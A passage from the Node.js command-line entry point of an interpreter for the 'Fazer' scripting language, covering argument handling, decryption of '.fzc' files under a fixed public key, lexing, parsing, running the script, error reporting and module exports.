    } catch (e) {
        console.error(e);
    }
    return;
  }

  if (cmd === "run") {
    fileArg = argv[1];
    if (!fileArg) usage();
    const sep = argv.indexOf("--");
    forwarded = sep >= 0 ? argv.slice(sep + 1) : [];
  } else {
    // Check if cmd looks like a file or we treat it as one
    if (cmd.endsWith(".fz") || fs.existsSync(cmd)) {
      fileArg = cmd;
      // All subsequent args are passed to script
      forwarded = argv.slice(1);
    } else {
      console.error(`Unknown command or file not found: '${cmd}'\n`);
      usage();
    }
  }

  const filePath = path.resolve(fileArg);
  if (!fs.existsSync(filePath)) {
    console.error(`File not found: ${filePath}`);
    process.exit(1);
  }

  let code = fs.readFileSync(filePath, "utf8");

  // --- DECRYPT IF FZC ---
  if (code.startsWith("FZC01")) {
      try {
          const crypto = require("crypto");
          const STATIC_KEY = crypto.createHash('sha256').update("FazerLangPublicRuntimeKey2026").digest();
          const iv = Buffer.from(code.substring(5, 37), 'hex');
          const encryptedText = code.substring(37);
          const decipher = crypto.createDecipheriv('aes-256-cbc', STATIC_KEY, iv);
          let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
          decrypted += decipher.final('utf8');
          code = decrypted;
      } catch(e) {
          console.error("Error: Failed to decrypt .fzc file. It might be corrupted or version mismatch.");
          process.exit(1);
      }
  }
  // ----------------------

  const lex = lexer.tokenize(code);
  if (lex.errors.length) {
    console.error("Lexer error:", lex.errors[0].message || String(lex.errors[0]));
    process.exit(1);
  }

  const parser = new FazerParser();
  parser.input = lex.tokens;
  let ast;
  try {
      ast = parser.program();
  } catch (e) {
      if (e.name === "FazerError") {
          console.error(prettyError(e, filePath, code));
          process.exit(1);
      }
      throw e;
  }

  if (parser.errors.length) {
    const e = parser.errors[0];
    const tok = e.token || (lex.tokens.length ? lex.tokens[0] : null);
    const meta = tok ? locOf(tok) : null;
    const ferr = new FazerError(e.message, meta || {});
    console.error(prettyError(ferr, filePath, code));
    process.exit(1);
  }

  const rt = new FazerRuntime({ argv: forwarded, filename: filePath, code });
  try {
    await rt.run(ast);
  } catch (err) {
    if (err instanceof FazerError) {
      console.error(prettyError(err, filePath, code));
    } else {
      console.error(err && err.stack ? err.stack : String(err));
    }
    process.exit(1);
  }
}

module.exports = {
  Lexer,
  createToken,
  FazerParser,
  FazerRuntime,
  FazerError,
  lexer,
  prettyError,
  locOf
};

if (require.main === module) main().catch(e => { console.error(e); process.exit(1); });
